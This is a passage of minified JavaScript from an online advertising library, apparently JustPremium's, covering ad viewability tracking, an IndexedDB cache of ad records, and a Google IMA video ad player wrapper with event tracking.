            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    var l = s.default.getTopScope(),
      p = new WeakMap(),
      g = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            n = i,
            o = {};
          return p.set(n, o), o.di = r.di, o.settings = {
            start: Date.now(),
            interval: [667, 1334, 2668, 5336],
            intervalLevel: 0,
            key: "",
            endOfTrack: !1,
            checkInView: !0
          }, o.visiblePanels = new Set(), o.viewabilityTime = {
            total: {
              totalViewTime: 0,
              lastViewStarted: 0
            },
            left: {
              totalViewTime: 0,
              lastViewStarted: 0
            },
            right: {
              totalViewTime: 0,
              lastViewStarted: 0
            },
            center: {
              totalViewTime: 0,
              lastViewStarted: 0
            },
            top: {
              totalViewTime: 0,
              lastViewStarted: 0
            },
            bottom: {
              totalViewTime: 0,
              lastViewStarted: 0
            }
          }, o.panelsToTrack = [], o.expandedTime = {
            left: {
              totalTime: 0,
              lastStartTime: 0
            },
            right: {
              totalTime: 0,
              lastStartTime: 0
            },
            center: {
              totalTime: 0,
              lastStartTime: 0
            },
            top: {
              totalTime: 0,
              lastStartTime: 0
            },
            bottom: {
              totalTime: 0,
              lastStartTime: 0
            }
          }, n.setKey(), i;
        }
        return d(t, e), t.prototype.init = function () {
          var e = this,
            t = p.get(e);
          0 != t.panelsToTrack.length && (t.panelsToTrack.forEach(function (t) {
            e.visibilityChecker(t.domElement, t.panel);
          }), t.settings.start = Date.now(), e.sendTrackingInterval());
        }, t.prototype.setPanelToTrack = function (e, t) {
          var r = p.get(this);
          return !(!e || !e.getDOMElement) && (r.panelsToTrack.push({
            panel: t,
            domElement: e.getDOMElement()
          }), !0);
        }, t.prototype.sendTrackingInterval = function () {
          var e = this,
            t = p.get(e);
          t.settings.endOfTrack || (t.settings.trackingInterval = a.default.delay(e, function () {
            e.sendTracking(), e.sendTrackingInterval();
          }, e.getTrackingIntervalTime()));
        }, t.prototype.startExpandedTime = function (e) {
          p.get(this).expandedTime[e].lastStartTime = performance.now();
        }, t.prototype.stopExpandedTime = function (e) {
          p.get(this).expandedTime[e].lastStartTime = 0;
        }, t.prototype.updateExpandedPanelTimer = function () {
          var e = p.get(this),
            t = performance.now();
          e.panelsToTrack.forEach(function (r) {
            var i = e.expandedTime[r.panel].lastStartTime;
            if (i > 0) {
              var n = t - i;
              e.expandedTime[r.panel].totalTime = parseFloat(e.expandedTime[r.panel].totalTime) + n, e.expandedTime[r.panel].lastStartTime = t;
            }
          });
        }, t.prototype.buildThresholdList = function () {
          for (var e = [], t = 1; t <= 20; t++) {
            var r = t / 20;
            e.push(r);
          }
          return e.push(0), e;
        }, t.prototype.visibilityChecker = function (e, t) {
          e.jpPanel = t;
          var r = {
            root: null,
            rootMargin: "0px",
            threshold: this.buildThresholdList()
          };
          new IntersectionObserver(this.intersectionCallback.bind(this), r).observe(e), this.handleRefreshInterval();
        }, t.prototype.intersectionCallback = function (e) {
          var t = p.get(this);
          e.forEach(function (e) {
            var r = e.target;
            e.isIntersecting && e.intersectionRatio >= .5 ? (t.viewabilityTime[e.target.jpPanel].lastViewStarted = e.time, t.visiblePanels.add(r)) : t.visiblePanels.delete(r);
          }, this);
        }, t.prototype.handleRefreshInterval = function () {
          var e = this,
            t = p.get(e);
          t.visiblePanels.size > 0 ? e.updatePanelTimer({
            jpPanel: "total"
          }) : t.viewabilityTime.total.lastViewStarted = 0, t.visiblePanels.forEach(function (t) {
            e.updatePanelTimer(t);
          }), e.updateExpandedPanelTimer(), a.default.delay(e, function () {
            e.handleRefreshInterval();
          }, 100);
        }, t.prototype.updatePanelTimer = function (e) {
          var t = p.get(this),
            r = t.viewabilityTime[e.jpPanel].lastViewStarted,
            i = performance.now();
          if (r) {
            var n = i - r;
            t.viewabilityTime[e.jpPanel].totalViewTime = parseFloat(t.viewabilityTime[e.jpPanel].totalViewTime) + n;
          }
          t.viewabilityTime[e.jpPanel].lastViewStarted = i;
        }, t.prototype.sendTracking = function () {
          var e = p.get(this),
            t = e.di,
            r = t.jModel,
            o = t.config,
            a = Date.now() - e.settings.start,
            s = e.settings.key,
            u = n.default.factory(t.global, "tiv");
          u.set("format", o.format), u.set("cid", s), u.set("aid", o.adId), u.set("zoneId", o.zoneId), u.set("domain", l.location.host), e.di.global && e.di.global.geo && u.set("country", e.di.global.geo.isocode), u.set("total", a), u.set("totalInView", parseInt(e.viewabilityTime.total.totalViewTime)), u.set("left", parseInt(e.viewabilityTime.left.totalViewTime)), u.set("right", parseInt(e.viewabilityTime.right.totalViewTime)), u.set("center", parseInt(e.viewabilityTime.center.totalViewTime)), u.set("top", parseInt(e.viewabilityTime.top.totalViewTime)), u.set("bottom", parseInt(e.viewabilityTime.bottom.totalViewTime)), u.set("leftExpanded", parseInt(e.expandedTime.left.totalTime)), u.set("rightExpanded", parseInt(e.expandedTime.right.totalTime)), u.set("centerExpanded", parseInt(e.expandedTime.center.totalTime)), u.set("topExpanded", parseInt(e.expandedTime.top.totalTime)), u.set("bottomExpanded", parseInt(e.expandedTime.bottom.totalTime)), r.getData("trackerId") && u.set("trackerId", r.getData("trackerId")), r.getData("isAdv") && r.addProperty("isAdv", !0), i.default.instance().trackRaw(u, "viewability");
        }, t.prototype.setKey = function () {
          var e = p.get(this),
            t = e.di.jModel;
          e.settings.key = u.default.getCreativeId(t.getData("creative").html);
        }, t.prototype.stopTracking = function () {
          var e = p.get(this);
          e.settings.checkInView = !1, e.settings.trackingInterval && e.settings.trackingInterval(), e.settings.endOfTrack = !0;
        }, t.prototype.getTrackingIntervalTime = function () {
          var e = p.get(this),
            t = void 0;
          return t = e.settings.intervalLevel < 3 ? e.settings.interval[0] : e.settings.intervalLevel >= 3 && e.settings.intervalLevel < 6 ? e.settings.interval[1] : e.settings.intervalLevel >= 6 && e.settings.intervalLevel < 9 ? e.settings.interval[2] : e.settings.interval[3], e.settings.intervalLevel++, t;
        }, t.factory = function (e) {
          return new t(e);
        }, t;
      }(o.default);
    t.default = g;
  },
  565: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = function () {
      function e(t, r) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), t.server = t.server || {
          ruid: null,
          suid: null,
          uuid: null
        }, this.type = r, this.trackingUrl = "tracking2.justpremium.com/medusa.gif", this.vr = "v2.44.492", this.rid = t.server.ruid, this.sid = t.server.suid, this.uid = t.server.uuid;
      }
      return e.prototype.get = function (e) {
        return void 0 === this[e] ? "" : this[e];
      }, e.prototype.set = function (e, t) {
        this[e] = t;
      }, e.factory = function (t, r) {
        return new e(t, r);
      }, e;
    }();
    t.default = i;
  },
  566: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), r(567);
    var i = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB || window.shimIndexedDB,
      n = "Justpremium",
      o = "JPX_storage",
      a = !0,
      s = {
        init: function () {
          var e = i.open(n, 1);
          return new Promise(function (t, r) {
            e.onupgradeneeded = function () {
              var i = e.result.createObjectStore(o, {
                keyPath: "id",
                autoIncrement: !0
              });
              i.createIndex("Flag", "flag"), i.createIndex("Adunitid", "adunitid"), i.createIndex("Uip", "uip"), i.createIndex("Resid", "resid"), i.onsuccess = function (e) {
                t(e);
              }, i.onerror = function (e) {
                r(e);
              };
            };
          });
        },
        checkSupport: function () {
          return a;
        },
        save: function (e) {
          var t = i.open(n, 1);
          return new Promise(function (r, i) {
            t.onsuccess = function () {
              var n = t.result,
                a = n.transaction(o, "readwrite"),
                s = a.objectStore(o).put(e);
              s.onsuccess = function (e) {
                r(e);
              }, s.onerror = function (e) {
                i(e);
              }, a.oncomplete = function () {
                n.close();
              };
            };
          });
        },
        deleteOld: function (e) {
          var t = i.open(n, 1);
          return new Promise(function (r, i) {
            t.onsuccess = function () {
              var n = t.result,
                a = n.transaction(o, "readwrite"),
                s = a.objectStore(o);
              s.openCursor().onsuccess = function (e) {
                var t = e.target.result;
                if (t) {
                  if (t.value.ads.source) {
                    var n = t.value;
                    if ("new" === n.ads.source) {
                      n.ads.source = "cache";
                      var o = t.update(n);
                      o.onerror = function (e) {
                        i(e);
                      }, o.onsuccess = function (e) {
                        r(e);
                      };
                    }
                  }
                  t.continue();
                }
              }, s.getAll().onsuccess = function (t) {
                if (t.target && t.target.result) for (var n = 0; n < t.target.result.length; n++) {
                  var o = t.target.result[n];
                  if (o.flag === e && Date.now() - o.date > 27e4) {
                    var a = s.delete(o.id);
                    a.onerror = function (e) {
                      i(e);
                    }, a.onsuccess = function (e) {
                      r(e);
                    };
                  }
                }
              }, a.oncomplete = function () {
                n.close();
              };
            };
          });
        },
        deleteById: function (e) {
          var t = i.open(n, 1);
          return new Promise(function (r, i) {
            t.onsuccess = function () {
              var n = t.result,
                a = n.transaction(o, "readwrite"),
                s = a.objectStore(o);
              s.index("Resid").get(e).onsuccess = function (e) {
                if (e.target && e.target.result) {
                  var t = s.delete(e.target.result.id);
                  t.onerror = function (e) {
                    i(e);
                  }, t.onsuccess = function (e) {
                    r(e);
                  };
                }
              }, a.oncomplete = function () {
                n.close();
              };
            };
          });
        },
        deleteByAdIpAddress: function (e) {
          var t = i.open(n, 1);
          return new Promise(function (r, i) {
            t.onsuccess = function () {
              var n = t.result,
                a = n.transaction(o, "readwrite"),
                s = a.objectStore(o);
              s.index("Uip").getAll(e).onsuccess = function (e) {
                if (e.target && e.target.result) for (var t = 0; t < e.target.result.length; t++) {
                  var n = s.delete(e.target.result[t].id);
                  n.onerror = function (e) {
                    i(e);
                  }, n.onsuccess = function (e) {
                    r(e);
                  };
                }
              }, a.oncomplete = function () {
                n.close();
              };
            };
          });
        },
        get: function (e) {
          return new Promise(function (t) {
            var r = i.open(n, 1);
            r.onsuccess = function () {
              var i = r.result;
              if (i.objectStoreNames.length) {
                var n = i.transaction([o], "readonly"),
                  a = n.objectStore(o);
                try {
                  a.index("Flag").getAll(e).onsuccess = function (e) {
                    t(e.target.result);
                  };
                } catch (e) {
                  t([]);
                }
                n.oncomplete = function () {
                  i.close();
                };
              } else t();
            };
          });
        }
      };
    try {
      s.init();
    } catch (e) {
      a = !1;
    }
    t.default = s;
  },
  567: function (e, t, r) {
    "use strict";

    !function () {
      var e, t, r, i, n;
      i = window.IDBObjectStore || window.webkitIDBObjectStore || window.mozIDBObjectStore || window.msIDBObjectStore, r = window.IDBIndex || window.webkitIDBIndex || window.mozIDBIndex || window.msIDBIndex, i && r && (void 0 !== i.prototype.getAll && void 0 !== r.prototype.getAll || (n = function () {
        this.onsuccess = null, this.readyState = "pending";
      }, e = function (e, t) {
        return {
          type: e,
          debug: t,
          bubbles: !1,
          cancelable: !1,
          eventPhase: 0,
          timeStamp: new Date()
        };
      }, t = function (t) {
        var r, i;
        return t = void 0 !== t ? t : null, r = new n(), i = [], this.openCursor(t).onsuccess = function (t) {
          var n, o;
          (n = t.target.result) ? (i.push(n.value), n.continue()) : "function" == typeof r.onsuccess && ((o = new e("success")).target = {
            readyState: "done",
            result: i
          }, r.onsuccess(o));
        }, r;
      }, void 0 === i.prototype.getAll && (i.prototype.getAll = t), void 0 === r.prototype.getAll && (r.prototype.getAll = t)));
    }();
  },
  570: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      },
      n = a(r(23)),
      o = a(r(1));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function s(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    var u = new WeakMap(),
      c = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            n = i,
            o = e.prototype._setPrivates.call(i, r);
          return n._promises = [], u.set(n, o), o.di = r.di, "mv" === o.di.jModel.getFormat() && (o.mediaElm = r.mediaElm), o.wrapperElm = r.wrapperElm, o.containerElm = r.containerElm, o.videoElm = r.videoElm, o.sizes = r.sizes, o.videoWithSource = "", o.videoElm.muted = !0, o.adCurrentTime = 0, o.adDuration = 3, o.getVastMediaHeight = 0, o.getVastMediaWidth = 0, o.isPlaying = !1, o.isPausedAd = !1, o.isIMADestroyed = !1, o.isVpaid = !1, o.playerError = !1, n._setUpIMA(r), i;
        }
        return s(t, e), t.prototype._addFullscreenClass = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
            t = this.returnVideoParentElm(),
            r = t.classList;
          e && !r.contains("jpx--video@fullscreen") ? t.classList.add("jpx--video@fullscreen") : r.contains("jpx--video@fullscreen") && t.classList.remove("jpx--video@fullscreen");
        }, t.prototype._bindAdsManagerEvents = function () {
          var e = this,
            t = u.get(e);
          t.adsManager.addEventListener(google.ima.AdEvent.Type.AD_PROGRESS, function (r) {
            var i = r.getAdData();
            t.adCurrentTime = i.currentTime || t.containerElm.querySelector("video").currentTime, e._updateProgress(), e.publish("progress", [e, t.videoElm]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.CLICK, function () {
            t.isPausedAd || t.adsManager.pause();
            var r = e._returnImaTrackingInfo("CLICK");
            r.action.emitted = "user", e.publish("imaClick", [r]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.COMPLETE, function () {
            e.publish("imaComplete", [e._returnImaTrackingInfo("COMPLETE")]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED, e._onContentPauseRequested.bind(e)), t.adsManager.addEventListener(google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED, e._onContentResumeRequested.bind(e)), t.adsManager.addEventListener(google.ima.AdEvent.Type.FIRST_QUARTILE, function () {
            e.publish("imaFirstQuartile", [e._returnImaTrackingInfo("FIRST_QUARTILE")]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.LOADED, function (r) {
            var i = r.getAd();
            t.getVastMediaHeight = i.getVastMediaHeight(), t.getVastMediaWidth = i.getVastMediaWidth(), t.isVpaid = "VPAID" === i.getApiFramework(), t.isVpaid && console.warn("VPAID' === event.getAd().getApiFr VPAID' === event.getAd().getApiFr VPAID' === event.getAd().getApiFr");
            var n = e._returnImaTrackingInfo("LOADED");
            n.creative.contentType = i.getContentType(), n.creative.title = i.getTitle(), n.creative.description = i.getDescription(), n.creative.duration = i.getDuration(), n.creative.adSystem = i.getAdSystem(), n.creative.apiFramework = i.getApiFramework(), n.creative.creativeId = i.getCreativeId(), n.creative.wrapperAdSystems = i.getWrapperAdSystems(), n.creative.wrapperCreativeIds = i.getWrapperCreativeIds(), n.creative.isLinear = i.isLinear(), e.publish("imaLoaded", [n]), e.publish("adLoaded", [e, t.videoElm]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.MIDPOINT, function () {
            e.publish("imaMidpoint", [e._returnImaTrackingInfo("MIDPOINT")]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.PAUSED, function () {
            t.isPlaying = !1, t.isPausedAd = !0;
            var r = e._returnImaTrackingInfo("PAUSED");
            r.action.emitted = t.playTriggeredByUser ? "user" : "auto", t.playTriggeredByUser = !1, e.publish("imaPaused", [r]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.RESUMED, function () {
            t.isPlaying = !0, t.isPausedAd = !1;
            var r = e._returnImaTrackingInfo("RESUMED");
            r.action.emitted = t.playTriggeredByUser ? "user" : "auto", t.playTriggeredByUser = !1, e.publish("imaResumed", [r]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.STARTED, function (r) {
            if (e.prepareIMAStructure()) {
              var i = e._returnImaTrackingInfo("STARTED");
              i.creative.apiFramework = r.getAd().getApiFramework(), e._setClickUrl(r), e._clearIMAStyles(), t.isPlaying = !0, e.publish("imaStarted", [i]), e.publish("adImpression", [e, r.getAd().getApiFramework()]);
            }
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.THIRD_QUARTILE, function () {
            e.publish("imaThirdQuartile", [e._returnImaTrackingInfo("THIRD_QUARTILE")]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.USER_CLOSE, function () {
            e.publish("imaUserClose", [e._returnImaTrackingInfo("USER_CLOSE")]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.VOLUME_CHANGED, function () {
            var r = e._returnImaTrackingInfo("VOLUME_CHANGED");
            r.action.emitted = t.muteTriggeredByUser ? "user" : "auto", e.publish("imaVolumeChanged", [r]);
          }), t.adsManager.addEventListener(google.ima.AdEvent.Type.VOLUME_MUTED, function () {
            var r = e._returnImaTrackingInfo("VOLUME_MUTED");
            r.action.emitted = t.muteTriggeredByUser ? "user" : "auto", t.muteTriggeredByUser = !1, e.publish("imaVolumeMuted", [r]);
          }), t.adsManager.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, e._onAdError.bind(e));
        }, t.prototype._clearIMAStyles = function () {
          this.returnIMAStructure().forEach(function (e) {
            e.style.cssText = "";
          }), this.returnImaSurrogateStructure().forEach(function (e) {
            e.style.cssText = "";
          });
        }, t.prototype._createAdDisplayContainer = function () {
          var e = u.get(this);
          e.adDisplayContainer = new google.ima.AdDisplayContainer(e.containerElm, e.videoElm);
        }, t.prototype._getClickUrl = function (e) {
          var t = void 0,
            r = function e(t, r) {
              if (t && t[r]) return t[r];
              var n = void 0,
                o = void 0;
              for (o in t) if (t.hasOwnProperty(o) && "object" === i(t[o]) && (n = e(t[o], r))) return n;
              return n;
            };
          return (t = r(e, "clickThroughUrl")) || (t = r(e, "page_url")), t;
        }, t.prototype._bindClickEvents = function () {
          var e = this;
          e.subscribe("userClick", function () {
            var t = e._returnImaTrackingInfo("CLICK");
            t.action.emitted = "user", e.publish("imaClick", [t]);
          });
        }, t.prototype._bindIMAEvents = function () {
          var e = this,
            t = u.get(e),
            r = t.di.jTracking;
          r && (e.subscribe("imaClick", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaComplete", function (e) {
            r.videoTracking(e), t.apiVideoPlayedOnce = !0;
          }), e.subscribe("imaFirstQuartile", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaLoaded", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaMidpoint", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaPaused", function (t) {
            e.getCurrentTimeInPercent() < 98 && r.videoTracking(t);
          }), e.subscribe("imaResumed", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaStarted", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaThirdQuartile", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaUserClose", function (t) {
            t && 0 === t.length && ((t = e._returnImaTrackingInfo("USER_CLOSE", "user")).creative.type = "video-only", t = [t]), r.videoTracking(t);
          }), e.subscribe("imaVolumeChanged", function (e) {
            r.videoTracking(e);
          }), e.subscribe("imaVolumeMuted", function (e) {
            r.videoTracking(e);
          }));
        }, t.prototype._imaPlayerError = function () {
          var e = u.get(this),
            t = ["There is no video source"];
          e.imaElm1.querySelector("lima-video") && t.push('Not supported custom element "lima-video"');
          var r = e.adsManager.getCurrentAd();
          if (r) {
            var i = r.getTitle(),
              n = r.getDescription(),
              o = r.getContentType(),
              a = r.getDuration(),
              s = r.getAdSystem(),
              c = r.getApiFramework(),
              d = r.getCreativeId(),
              l = r.getWrapperAdSystems(),
              p = r.getWrapperCreativeIds();
            i && t.push("title: " + i), n && t.push("description: " + n), o && t.push("contentType: " + o), a && t.push("duration: " + a), s && t.push("adSystem: " + s), c && t.push("apiFramework: " + c), d && t.push("creativeId: " + d), l && t.push("wrapperAdSystems: " + l), p && t.push("wrapperCreativeIds: " + p);
          }
          this.publish("playerError", [this.constructor.name + " | " + t.join(" | ")]);
        }, t.prototype._onAdError = function (e) {
          this.publish("playerError", [e]);
        }, t.prototype._onAdsManagerLoaded = function (e) {
          var t = u.get(this),
            r = new google.ima.AdsRenderingSettings();
          r.restoreCustomPlaybackStateOnAdBreakComplete = !0, (o.default.isMobile() && o.default.isAndroid() || o.default.isChrome()) && (r.mimeTypes = ["video/mp4", "video/webm"]), t.adsManager = e.getAdsManager(t.videoElm, r), t.adsManager.setVolume(0), this._bindAdsManagerEvents(), this._playAds();
        }, t.prototype._onContentPauseRequested = function (e) {
          u.get(this).adDuration = e.getAd().getDuration();
        }, t.prototype._onContentResumeRequested = function () {
          var e = u.get(this);
          this.publish("close", [this, e.videoElm]), e.adsLoader.destroy();
        }, t.prototype._playAds = function () {
          var e = u.get(this);
          try {
            e.adsInitialized || (e.adDisplayContainer.initialize(), e.adsInitialized = !0);
            var t = e.sizes[0],
              r = e.sizes[1];
            e.adsManager.init(t, r, google.ima.ViewMode.NORMAL), e.adsManager.start(), this.publish("playerLoaded", []);
          } catch (e) {
            this.publish("playerError", [e]);
          }
        }, t.prototype._returnImaTrackingInfo = function (e) {
          var t = u.get(this),
            r = t.di.jModel.getData("trackerId") ? t.di.jModel.getData("trackerId") : "";
          return {
            player: {
              sdk: "IMA",
              height: t.getVastMediaHeight,
              width: t.getVastMediaWidth
            },
            creative: {},
            action: {
              type: e,
              emitted: "auto",
              playback: t.adCurrentTime
            },
            site: {},
            trackerId: r
          };
        }, t.prototype._setClickUrl = function (e) {
          var t = u.get(this).di.jModel,
            r = void 0,
            i = e.getAd(),
            n = i.getTraffickingParametersString();
          !(r = this._getClickUrl(i)) && n && (n = JSON.parse(n), r = this._getClickUrl(n)), t.addProperty("clickURL", r);
        }, t.prototype._setUpIMA = function (e) {
          var t = this,
            r = u.get(t),
            i = r.di.jModel.getFormat();
          r.imaStructure = [], r.imaElm1 = e.wrapperElm, r.imaElm2 = e.containerElm, r.imaVideo1 = e.videoElm, r.imaElm3 = null, r.imaElm4 = null, r.imaVideo2 = null, r.imaVideoWithSrc = null, r.adsManager = null, r.adsRequest = null, r.adsInitialized = !1, google.ima.settings.setCookiesEnabled(!1), "mv" === i && google.ima.settings.setDisableCustomPlaybackForIOS10Plus(!0), t._createAdDisplayContainer(), r.adsLoader = new google.ima.AdsLoader(r.adDisplayContainer), r.adsLoader.getSettings().setVpaidMode(google.ima.ImaSdkSettings.VpaidMode.INSECURE), window.top.adsLoader = r.adsLoader, r.adsLoader.addEventListener(google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED, t._onAdsManagerLoaded.bind(t), !1), r.adsLoader.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, t._onAdError.bind(t), !1);
        }, t.prototype._updateProgress = function () {
          var e = u.get(this),
            t = e.di.jDOM.getElement("jp-video-ima-controls-progress-tag");
          if (-1 !== t) {
            var r = t.getDOMElement();
            r.max = this.getDuration(), r.value = e.adCurrentTime;
          }
        }, t.prototype.bindBackupVideoEvents = function (e) {
          var t = u.get(this);
          t.isBackupVideo = !0, t.videoElm = t.videoWithSource = e;
        }, t.prototype.destroyPlayer = function () {
          var e = u.get(this);
          e.adsManager && e.adsManager.destroy(), e.adsLoader && e.adsLoader.contentComplete(), e.adDisplayContainer && e.adDisplayContainer.destroy(), e.isIMADestroyed = !0, this.publish("imaDestroyed", []);
        }, t.prototype.executionFailure = function () {
          this.publish("imaExecutionFailure", [], 0);
        }, t.prototype.getContainer = function () {
          var e = u.get(this);
          return {
            clientWidth: e.wrapperElm.clientWidth,
            clientHeight: e.wrapperElm.clientHeight,
            setStyle: function (t, r) {
              e.wrapperElm.style[t] = r;
            }
          };
        }, t.prototype.getCurrentTime = function () {
          return u.get(this).adCurrentTime;
        }, t.prototype.getCurrentTimeInPercent = function () {
          return u.get(this).adCurrentTime / this.getDuration() * 100;
        }, t.prototype.getDuration = function () {
          return u.get(this).adDuration;
        }, t.prototype.getParentObject = function () {
          return u.get(this).wrapperElm;
        }, t.prototype.getPlayerHeight = function () {
          return this.getParentObject().offsetHeight;
        }, t.prototype.getPlayerWidth = function () {
          return this.getParentObject().offsetWidth;
        }, t.prototype.getSources = function () {
          var e = u.get(this).imaVideoWithSrc;
          if (e) {
            var t = e.currentSrc || e.src;
            return t || "";
          }
          return !1;
        }, t.prototype.getVideoHeight = function () {
          if (this.returnVideoContainerElm()) return this.returnVideoContainerElm().videoHeight;
        }, t.prototype.getVideoWidth = function () {
          if (this.returnVideoContainerElm()) return this.returnVideoContainerElm().videoWidth;
        }, t.prototype.init = function () {
          var e = u.get(this),
            t = e.di.jModel;
          e.adsRequest = new google.ima.AdsRequest(), e.adsRequest.adsResponse = t.getData("creative.vastRaw"), e.adsRequest.adsResponse = e.adsRequest.adsResponse.replace('<?xml version="1.0" encoding="UTF-8" ?>', ""), window.top._vast = e.adsRequest.adsResponse;
          var r = e.sizes[0],
            i = e.sizes[1];
          e.adsRequest.linearAdSlotWidth = r, e.adsRequest.linearAdSlotHeight = i, e.adsRequest.nonLinearAdSlotWidth = r, e.adsRequest.nonLinearAdSlotHeight = i, e.adsRequest.vastLoadTimeout = 12e3, e.adsRequest.setAdWillAutoPlay(e.autoplayAllowed), e.adsRequest.setAdWillPlayMuted(e.autoplayRequiresMuted), e.adsLoader.requestAds(e.adsRequest), this.publish("onRequestAds", [this]);
        }, t.prototype.isMuted = function () {
          return !u.get(this).adsManager.getVolume();
        }, t.prototype.isPlaying = function () {
          return u.get(this).isPlaying;
        }, t.prototype.mute = function () {
          var e = u.get(this);
          e.videoElm.muted = !0, e.videoElm.volume = 0, 1 === e.adsManager.getVolume() && this._updateVolumeSlider(!0), e.adsManager.setVolume(0);
        }, t.prototype.pause = function () {
          var e = u.get(this);
          e.videoElm.pause(), e.adsManager.pause(), e.isPlaying = !1, this.publish("pause", []);
        }, t.prototype.play = function () {
          var t = u.get(this);
          t.isBackupVideo && e.prototype.play.call(this), this.publish("play", []), t.isPausedAd ? t.adsManager.resume() : t.isPlaying = !0;
        }, t.prototype.prepareIMAStructure = function () {
          var e = u.get(this);
          e.imaStructure.push(e.imaElm1), e.imaStructure.push(e.imaElm2), e.imaStructure.push(e.imaVideo1), e.imaElm2.children[0] && (e.imaElm3 = e.imaElm2.children[0], e.imaStructure.push(e.imaElm3)), e.imaElm3.children[0] && (e.imaElm4 = e.imaElm3.children[0], e.imaStructure.push(e.imaElm4));
          var t = e.imaElm4.querySelector("video");
          t && (e.imaVideo2 = t, e.imaStructure.push(e.imaVideo2));
          var r = this.returnVideoElement();
          return r ? (r.volume = 0, r.setAttribute("muted", ""), r.setAttribute("playsinline", ""), e.imaVideoWithSrc = r, !0) : (this._imaPlayerError(), !1);
        }, t.prototype.preventClickIfAdvertisementDivAvailable = function () {
          var e = this.returnAdContainerSecondChild();
          if (e) {
            var t = e.lastChild;
            return t && "DIV" === t.tagName ? t : void 0;
          }
        }, t.prototype.ready = function () {
          return Promise.all(this._promises).then(function (e) {
            return e;
          });
        }, t.prototype.resume = function () {
          var e = u.get(this);
          e.adsManager.resume(), e.isPlaying = !0, this.publish("play", []);
        }, t.prototype.returnAdContainer = function () {
          return u.get(this).containerElm;
        }, t.prototype.returnAdContainerChild = function () {
          return this.returnAdContainer().children[0];
        }, t.prototype.returnAdContainerSecondChild = function () {
          var e = this.returnAdContainerChild();
          if (e && (!e || e.childElementCount)) return e.children[0];
        }, t.prototype.returnAdImaVideo = function () {
          return u.get(this).imaVideo1;
        }, t.prototype.returnBackupVideoElement = function () {
          return u.get(this).di.jDOM.getElement("jp-video-backup-element").getDOMElement();
        }, t.prototype.returnContainer = function () {
          return u.get(this).wrapperElm;
        }, t.prototype.returnIMAStructure = function () {
          return u.get(this).imaStructure;
        }, t.prototype.returnImaSurrogateStructure = function () {
          var e = this,
            t = [];
          return e.returnSpotXFrame() && t.push(e.returnSpotXFrame()), e.returnSpotXFrameParent() && t.push(e.returnSpotXFrameParent()), e.returnSpotXFrameChild() && (e.returnSpotXFrameChild().style.height = "100%", e.returnSpotXFrameChild().style.width = "100%"), t;
        }, t.prototype.returnMedia = function () {
          return u.get(this).mediaElm;
        }, t.prototype.returnSpotXFrame = function () {
          var e = this.returnAdContainer().querySelector(".spotx_surrogate_iframe");
          return -1 === e && (e = this.returnAdContainer().querySelector("iframe")), e;
        }, t.prototype.returnSpotXFrameChild = function () {
          var e = this.returnSpotXFrame();
          return !(!e || !e.contentWindow.document.querySelector("iframe")) && this.returnSpotXFrame().contentWindow.document.querySelector("iframe");
        }, t.prototype.returnSpotXFrameParent = function () {
          if (this.returnSpotXFrame()) {
            var e = this.returnSpotXFrame().parentElement;
            return e.classList.add("jp-video-surrogate", "jpx-ima-surrogate"), e;
          }
          return !1;
        }, t.prototype.returnVideoContainer = function () {
          return u.get(this).containerElm.querySelector("video");
        }, t.prototype.returnVideoContainerElm = function () {
